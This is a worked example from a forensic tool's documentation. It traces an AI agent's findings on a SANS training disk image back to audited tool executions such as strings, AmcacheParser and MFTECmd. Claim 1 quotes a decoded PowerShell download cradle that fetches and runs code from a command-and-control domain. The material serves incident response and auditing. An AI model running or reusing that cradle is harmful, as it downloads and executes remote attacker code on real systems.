# Audit trail — three‑claim trace (worked example)

This is a worked example of the judging test for **Audit Trail Quality**: *"Can judges trace any finding back to
the specific tool execution that produced it? Could another analyst reconstruct the investigation from the logs
alone?"* Pick findings from the agent's report, and land on the command that produced each — here, from a single
per‑case file.

Everything below is **real output** from running Camel against the SANS FOR508 **SRL‑2018 rd‑01** host
(`/mnt/rd01-c`, the rd‑01 C: drive). The audit file [`audit-srl-2018-rd01.clef`](audit-srl-2018-rd01.clef) was
produced by [`tests/Camel.Tests.Workflows/AuditSampleGenerator.cs`](../../tests/Camel.Tests.Workflows/AuditSampleGenerator.cs)
— three analysis invocations through the same workflow → toolkit → environment code paths the MCP server drives.

## How the trail works (30 seconds)

- The agent calls the **`SetCaseId`** tool once (`srl-2018-rd01`); every tool execution afterward is written to
  `audit-<caseId>.clef` — structured JSON ([CLEF](https://clef-json.org/)), one event per line.
- Every `ExecuteJavaScript` result ends with an **audit handle**: `[audit] case=srl-2018-rd01 invocation=<id>`.
  The agent cites that `invocation` id next to each finding.
- Each command event carries the full chain ambiently: **`Workflow` › `WorkflowOperation` › `Toolkit`/`Operation`
  › `Command`/`Arguments`**, plus `Host`, `ExitCode`, `DurationMs`, `CaseId`, `InvocationId`.

Trace any finding with the cited invocation id:

```bash
./trace.sh <invocationId>          # e.g. ./trace.sh 7f3a9c21
```

---

## Claim 1 — Fileless WMI persistence launching a C2 download cradle

> **Agent report:** "rd‑01 has fileless persistence: a WMI `CommandLineEventConsumer` named
> **`SystemPerformanceMonitor`** runs an encoded PowerShell command that decodes to
> `IEX (New-Object System.Net.WebClient).downloadstring('http://squirreldirectory.com/a')` — a download cradle to
> the **squirreldirectory.com** C2. `[audit] case=srl-2018-rd01 invocation=7f3a9c21`"

Trace it:

```bash
$ ./trace.sh 7f3a9c21
```

The producing tool execution in `audit-srl-2018-rd01.clef` (verbatim):

```json
{"@t":"2026-06-12T23:46:27.34Z","Host":"192.168.8.117","Command":"strings",
 "Arguments":"-t d -n 6 '/mnt/rd01-c/Windows/System32/wbem/Repository/OBJECTS.DATA'",
 "ExitCode":0,"DurationMs":1279,"EventType":"command",
 "WorkflowOperation":"FindWmiPersistenceAsync","Workflow":"WindowsAnalysisWorkflow",
 "InvocationId":"7f3a9c21","CaseId":"srl-2018-rd01"}
```

The finding traces to `FindWmiPersistenceAsync` reading the WMI repository `OBJECTS.DATA` on the rd‑01 host. The
encoded value and its decode are the workflow's output (`SuspiciousConsumers[0].Command` / `.DecodedCommand`).
**Verdict: supported.**

## Claim 2 — Execution evidence recovered from Amcache

> **Agent report:** "Amcache recovered **227** binaries with execution evidence on rd‑01 (paths, SHA‑1, compile
> times) for cross‑referencing against the timeline. `[audit] case=srl-2018-rd01 invocation=2e8b14d6`"

```bash
$ ./trace.sh 2e8b14d6
```

```json
{"@t":"2026-06-12T23:46:29.40Z","Host":"192.168.8.117",
 "Command":"dotnet /opt/zimmermantools/AmcacheParser.dll",
 "Arguments":"-f '/mnt/rd01-c/Windows/appcompat/Programs/Amcache.hve' --csv /tmp/camel_ez_4c9eafe7…",
 "ExitCode":0,"DurationMs":506,"EventType":"command",
 "Operation":"AmcacheParser","Toolkit":"WindowsAnalysis",
 "WorkflowOperation":"GetExecutedBinariesFromAmcacheAsync","Workflow":"WindowsAnalysisWorkflow",
 "InvocationId":"2e8b14d6","CaseId":"srl-2018-rd01"}
```

The count traces to `GetExecutedBinariesFromAmcacheAsync` running **AmcacheParser** (an Eric Zimmerman tool) over
`Amcache.hve`. **Verdict: supported.**

## Claim 3 — Filesystem metadata from the $MFT

> **Agent report:** "Parsed **15,433** `$MFT` file records from rd‑01 (entry 0 = `$MFT`, confirming the NTFS
> volume) as the basis for the file‑system timeline. `[audit] case=srl-2018-rd01 invocation=9a4f7b03`"

```bash
$ ./trace.sh 9a4f7b03
```

```json
{"@t":"2026-06-12T23:46:30.06Z","Host":"192.168.8.117",
 "Command":"dotnet /opt/zimmermantools/MFTECmd.dll",
 "Arguments":"-f '/tmp/rd01_mft_head' --json /tmp/camel_ez_33918de0…",
 "ExitCode":0,"DurationMs":564,"EventType":"command",
 "Operation":"MFTECmd","Toolkit":"WindowsAnalysis",
 "InvocationId":"9a4f7b03","CaseId":"srl-2018-rd01"}
```

The record count traces to the **MFTECmd** execution. (No `Workflow` field here — this invocation called the
toolkit directly rather than through a workflow, and the trail records that honestly.) **Verdict: supported.**

---

## Reconstruct the case from the file alone

The whole investigation is in one file, grouped by invocation. List the headline tool executions (those that ran
a named SIFT tool) end to end:

```bash
jq -r 'select(.EventType=="command" and .Toolkit)
       | "\(.["@t"])  \(.Workflow // "-") › \(.Operation)  $ \(.Command) \(.Arguments)"' \
   audit-srl-2018-rd01.clef
```

No `jq`? Every record is one line, so plain `grep` works too:

```bash
grep '"InvocationId":"7f3a9c21"' audit-srl-2018-rd01.clef
```

Each invocation also has `invocation started`/`completed` boundary events (the `started` event carries the exact
JavaScript the agent ran), so the file records not just *which* commands ran but *what code* drove them and
*how long* each took.
